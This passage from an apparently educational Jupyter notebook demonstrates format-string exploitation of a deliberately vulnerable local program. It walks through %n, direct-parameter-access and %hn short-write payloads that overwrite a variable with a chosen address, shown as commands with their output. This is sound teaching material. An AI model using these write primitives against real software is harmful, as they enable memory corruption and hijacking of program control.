   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "153"
     ]
    }
   ],
   "source": [
    "# 0xaa is final value - 25 is what 8 width provides\n",
    "! printf \"%d\" $(( 0xaa - 25 + 8))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b-%x-%x-%153x-%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b-ffffbf60-0-                                                                                                                                                  80491ac-\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 170 0x000000aa\r\n",
      "[*] text is @ 0xffffbf60\r\n"
     ]
    }
   ],
   "source": [
    "# replace width 8 with the resulting value\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\")-%x-%x-%153x-%n\n",
    "# text_val = 0x000000aa\n",
    "# we've aa least significant byte in right the place"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\bJUNK)�\u0004\bJUNK*�\u0004\bJUNK+�\u0004\b-%x-%x-%8x%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\bJUNK)�\u0004\bJUNK*�\u0004\bJUNK+�\u0004\b-ffffbf50-0- 80491ac\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 48 0x00000030\r\n",
      "[*] text is @ 0xffffbf50\r\n"
     ]
    }
   ],
   "source": [
    "# next write 0xbb, 0xcc, and 0xdd\n",
    "# need 3 more %x%n format to write to each byte of addresses\n",
    "# since %x needs some 4 bytes to write, we can provide anything such as JUNK\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08JUNK\\x29\\xc0\\x04\\x08JUNK\\x2a\\xc0\\x04\\x08JUNK\\x2b\\xc0\\x04\\x08\")-%x-%x-%8x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "130\r\n"
     ]
    }
   ],
   "source": [
    "# what is the width so the final value is 0xaa\n",
    "! echo $(( 0xaa-48+8 ))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\bJUNK)�\u0004\bJUNK*�\u0004\bJUNK+�\u0004\b-%x-%x-%130x%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\bJUNK)�\u0004\bJUNK*�\u0004\bJUNK+�\u0004\b-ffffbf50-0-                                                                                                                           80491ac\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 170 0x000000aa\r\n",
      "[*] text is @ 0xffffbf50\r\n"
     ]
    }
   ],
   "source": [
    "# replace width 8 width with the result to write 0xaa\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08JUNK\\x29\\xc0\\x04\\x08JUNK\\x2a\\xc0\\x04\\x08JUNK\\x2b\\xc0\\x04\\x08\")-%x-%x-%130x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "17\n"
     ]
    }
   ],
   "source": [
    "# next need to write 0xbb in 2nd byte\n",
    "print(0xbb - 0xaa)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\bJUNK)�\u0004\bJUNK*�\u0004\bJUNK+�\u0004\b-%x-%x-%130x%n-%16x%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\bJUNK)�\u0004\bJUNK*�\u0004\bJUNK+�\u0004\b-ffffbf40-0-                                                                                                                           80491ac-        4b4e554a\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 48042 0x0000bbaa\r\n",
      "[*] text is @ 0xffffbf40\r\n"
     ]
    }
   ],
   "source": [
    "# now write 0xbb in correct address\n",
    "# add %17x%n or -%16x%n\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08JUNK\\x29\\xc0\\x04\\x08JUNK\\x2a\\xc0\\x04\\x08JUNK\\x2b\\xc0\\x04\\x08\")-%x-%x-%130x%n-%16x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "17\n"
     ]
    }
   ],
   "source": [
    "print(0xcc - 0xbb)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\bJUNK)�\u0004\bJUNK*�\u0004\bJUNK+�\u0004\b-%x-%x-%130x%n-%16x%n-%16x%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\bJUNK)�\u0004\bJUNK*�\u0004\bJUNK+�\u0004\b-ffffbf40-0-                                                                                                                           80491ac-        4b4e554a-        4b4e554a\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 13417386 0x00ccbbaa\r\n",
      "[*] text is @ 0xffffbf40\r\n"
     ]
    }
   ],
   "source": [
    "# now write 0xcc in correct address\n",
    "# add %17x%n or -16x\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08JUNK\\x29\\xc0\\x04\\x08JUNK\\x2a\\xc0\\x04\\x08JUNK\\x2b\\xc0\\x04\\x08\")-%x-%x-%130x%n-%16x%n-%16x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "17\n"
     ]
    }
   ],
   "source": [
    "# finally write 0xdd\n",
    "print(0xdd - 0xcc)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\bAAAA)�\u0004\bAAAA*�\u0004\bBBBB+�\u0004\b-%x-%x-%130x%n-%16x%n-%16x%n-%16x%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\bAAAA)�\u0004\bAAAA*�\u0004\bBBBB+�\u0004\b-ffffbf30-0-                                                                                                                           80491ac-        41414141-        41414141-        42424242\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -573785174 0xddccbbaa\r\n",
      "[*] text is @ 0xffffbf30\r\n"
     ]
    }
   ],
   "source": [
    "# now write 0xdd in correct address\n",
    "# add %17x%n or -%16x%n\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08AAAA\\x29\\xc0\\x04\\x08AAAA\\x2a\\xc0\\x04\\x08BBBB\\x2b\\xc0\\x04\\x08\")-%x-%x-%130x%n-%16x%n-%16x%n-%16x%n\n",
    "# note JUNK can be anything"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Direct Parameter Access\n",
    "- simplified way to exploit format string vulnerability\n",
    "- allows parameters to be accessed directly by using argument order # (starting from 1) and the the dollar sign qualifier\n",
    "    - `%1$d` - access the $1^{st}$ parameter and display it as a decimal number\n",
    "    - `%2$x` - access the $2^{nd}$ parameter and display it as as a hexadecimal number\n",
    "- instead of sequentially accessing the first three parameters and using 4 bytes spacers of JUNK to increment the byte output count, we can use direct parameter access\n",
    "- let's write a more realistic-looking address of **0xbffffd72** into the variable test_val in fmt_vuln program\n",
    "- see look into how direct parameter access works using example provided in demo-programs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "\r\n",
      "int main() {\r\n",
      "    printf(\"7th: %7$d, 4th: %4$05d\\n\", 10, 20, 30, 40, 50, 60, 70, 80);\r\n",
      "    return 0;\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cat ./demos/fmt_strings/fmt_directpara.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "input=\"./demos/fmt_strings/fmt_directpara.cpp\"\n",
    "output=\"directpara.exe\"\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 88,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "7th: 70, 4th: 00040\r\n"
     ]
    }
   ],
   "source": [
    "! ./directpara.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%x%x%x%x\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAAffffbf70080491ac41414141\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffbf70\r\n"
     ]
    }
   ],
   "source": [
    "# without direct access\n",
    "! ./fmt_vuln.exe AAAA%x%x%x%x\n",
    "# 4th paramete is where AAAA repeats; not sure try one at a time by adding %x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%4$x\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAA41414141\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffbf70\r\n"
     ]
    }
   ],
   "source": [
    "# access the fourth argument (from beginning of the format string printf(...))\n",
    "# $ sign is special character for bash so must be escaped\n",
    "! ./fmt_vuln.exe AAAA%4\\$x\n",
    "# can try 1 at a time from 1...n until you see AAAA printed in hex"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%4$n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n"
     ]
    }
   ],
   "source": [
    "# use the same technique to write to the 4th argument as address\n",
    "! ./fmt_vuln.exe $(printf \"AAAA\")%4\\$n\n",
    "# get seg fault - because AAAA is not a valid address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 93,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b%4$n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 4 0x00000004\r\n",
      "[*] text is @ 0xffffbf70\r\n"
     ]
    }
   ],
   "source": [
    "# don't get segfault if 4th argument was a valid memory address\n",
    "# let's provide test_val's adddress\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\")%4\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 94,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b)�\u0004\b*�\u0004\b+�\u0004\b%4$n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b)�\u0004\b*�\u0004\b+�\u0004\b\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 16 0x00000010\r\n",
      "[*] text is @ 0xffffbf60\r\n"
     ]
    }
   ],
   "source": [
    "# no need of JUNK; just use direct parameter access to write the rest in each memory byte\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\\x29\\xc0\\x04\\x08\\x2a\\xc0\\x04\\x08\\x2b\\xc0\\x04\\x08\")%4\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "98\n"
     ]
    }
   ],
   "source": [
    "# let's write our controlled address: 0xbffffd72 to test_val\n",
    "# let's do some math to get 0x72\n",
    "print(0x72-16)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b)�\u0004\b*�\u0004\b+�\u0004\b%98x%4$n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b)�\u0004\b*�\u0004\b+�\u0004\b                                                                                          ffffbf60\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 114 0x00000072\r\n",
      "[*] text is @ 0xffffbf60\r\n"
     ]
    }
   ],
   "source": [
    "# use the result as width to get 0x72 as least significant value for our controlled address: 0xbffffd72\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\\x29\\xc0\\x04\\x08\\x2a\\xc0\\x04\\x08\\x2b\\xc0\\x04\\x08\")%98x%4\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "139\n"
     ]
    }
   ],
   "source": [
    "# do some math to print 0xfd of our controlled address: 0xbffffd72\n",
    "print(0xfd-0x72)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b)�\u0004\b*�\u0004\b+�\u0004\b%98x%4$n%139x%5$n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b)�\u0004\b*�\u0004\b+�\u0004\b                                                                                          ffffbf50                                                                                                                                          0\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 64882 0x0000fd72\r\n",
      "[*] text is @ 0xffffbf50\r\n"
     ]
    }
   ],
   "source": [
    "# use 139 as width to get 0xfd as next value\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\\x29\\xc0\\x04\\x08\\x2a\\xc0\\x04\\x08\\x2b\\xc0\\x04\\x08\")%98x%4\\$n%139x%5\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2\n"
     ]
    }
   ],
   "source": [
    "# do some math to print 0xff of our controlled address: 0xbffffd72\n",
    "print(0xff-0xfd)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 101,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "258\n"
     ]
    }
   ],
   "source": [
    "# width of 2 doesn't work; shorter than (4 bytes) memory address!\n",
    "# add 1 in the front to make 0xff a bigger number\n",
    "print(0x1ff-0xfd)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b)�\u0004\b*�\u0004\b+�\u0004\b%98x%4$n%139x%5$n%258x%6$n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b)�\u0004\b*�\u0004\b+�\u0004\b                                                                                          ffffbf50                                                                                                                                          0                                                                                                                                                                                                                                                           80491ac\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 33553778 0x01fffd72\r\n",
      "[*] text is @ 0xffffbf50\r\n"
     ]
    }
   ],
   "source": [
    "# use 2 as width to get 0xff as next value\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\\x29\\xc0\\x04\\x08\\x2a\\xc0\\x04\\x08\\x2b\\xc0\\x04\\x08\")%98x%4\\$n%139x%5\\$n%258x%6\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-64\n"
     ]
    }
   ],
   "source": [
    "# do some math to print 0xbf of our controlled address: 0xbffffd72\n",
    "print(0xbf-0xff)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "192\n"
     ]
    }
   ],
   "source": [
    "# negative width will not work!, make 0xbf larger by prepending 1\n",
    "print(0x1bf-0xff)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b)�\u0004\b*�\u0004\b+�\u0004\b%98x%4$n%139x%5$n%258x%6$n%192x%7$n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b)�\u0004\b*�\u0004\b+�\u0004\b                                                                                          ffffbf40                                                                                                                                          0                                                                                                                                                                                                                                                           80491ac                                                                                                                                                                                         804c028\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -1073742478 0xbffffd72\r\n",
      "[*] text is @ 0xffffbf40\r\n"
     ]
    }
   ],
   "source": [
    "# use 2 as width to get 0xff as next value\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\\x29\\xc0\\x04\\x08\\x2a\\xc0\\x04\\x08\\x2b\\xc0\\x04\\x08\")%98x%4\\$n%139x%5\\$n%258x%6\\$n%192x%7\\$n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Using Short (2 bytes) Writes\n",
    "- a `short` is typically a two-byte word using `h`\n",
    "- helps write an entire four-byte value with just two `%hn` parameters, instead of 4!\n",
    "- let's overwrite test_val variable with the address `0xbffffd72`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 105,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b%x%x%x%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\bffffbf70080491ac\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 20 0x00000014\r\n",
      "[*] text is @ 0xffffbf70\r\n"
     ]
    }
   ],
   "source": [
    "# update least significant byte\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\")%x%x%x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 106,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b%x%x%x%hn\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\bffffbf70080491ac\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -65516 0xffff0014\r\n",
      "[*] text is @ 0xffffbf70\r\n"
     ]
    }
   ],
   "source": [
    "# notice the test_val in hex: updates on both ends of the 4 bytes\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\")%x%x%x%hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 107,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b%4$hn\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -65532 0xffff0004\r\n",
      "[*] text is @ 0xffffbf70\r\n"
     ]
    }
   ],
   "source": [
    "# short write can be used with direct parameter access\n",
    "# update two least significnat bytes\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\")%4\\$hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "64874\n"
     ]
    }
   ],
   "source": [
    "# lets write 0xbffffd72 to test_val\n",
    "# 0xfd72 is written in first two (lower) bytes\n",
    "# Since 8 bytes of memory addresses will be written, subtract it from actual\n",
    "#  ./fmt_vuln.exe $(printf \"\\x2c\\xc0\\x04\\x08\\x2e\\xc0\\x04\\x08\")%[w]x%4\\$hn%[w]x%5\\%hn\n",
    "print(0xfd72-8)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 109,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b*�\u0004\b%64874x%4$hn\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b*�\u0004\b                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ffffbf60\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -654 0xfffffd72\r\n",
